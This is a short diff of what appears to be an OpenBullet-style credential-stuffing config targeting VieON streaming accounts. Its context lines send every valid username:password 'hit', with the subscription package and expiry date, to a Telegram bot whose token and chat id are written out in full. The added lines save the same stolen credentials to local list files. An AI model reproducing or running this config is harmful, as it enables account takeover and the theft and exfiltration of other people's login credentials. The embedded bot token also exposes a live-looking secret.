@@ -64,3 +64,9 @@ KeyCheck
 #Auto_Hit_telegram TlgSendMessage $"6690631010:AAHC5RDOtXmS5riiQUey5rpofmvyqlpUxQY" $"1407009078" 
   MESSAGE $"<USER>:<PASS> | Gói = <gói> | Date = <expires>" -> VAR "Auto Hit" 
 
+#Export_List_sdt FileAppendLines $"Vieon_list_sdt.txt" 
+  CONTENT $"<USER>:<PASS>" 
+
+#Export_list_data FileAppendLines $"Export_List_data.txt" 
+  CONTENT $"<USER>:<PASS> | Gói = <gói> | Date = <expires>" 
+
